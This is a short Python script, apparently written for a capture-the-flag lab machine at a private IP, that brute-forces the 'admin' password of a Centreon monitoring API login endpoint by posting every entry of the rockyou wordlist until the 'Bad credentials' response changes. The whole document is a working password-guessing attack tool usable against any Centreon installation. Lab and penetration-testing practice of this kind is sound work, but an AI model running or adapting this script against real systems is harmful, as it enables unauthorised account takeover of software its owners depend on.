import requests

url = "http://10.10.10.157/centreon/api/index.php?action=authenticate"
wordlist_path = "/usr/share/wordlists/rockyou.txt"

error_str = "\"Bad credentials\""

print("[!] Loading words...")

with open(wordlist_path, 'r') as file:
    words = file.readlines()

words = list(map(str.strip, words))

print("[!] Words loaded")

for w in words:

    data = {'username': 'admin', 'password': w}

    r = requests.post(url, data=data)

    if r.text != error_str:
        print("PASSWORD FOUND: ", w)
        break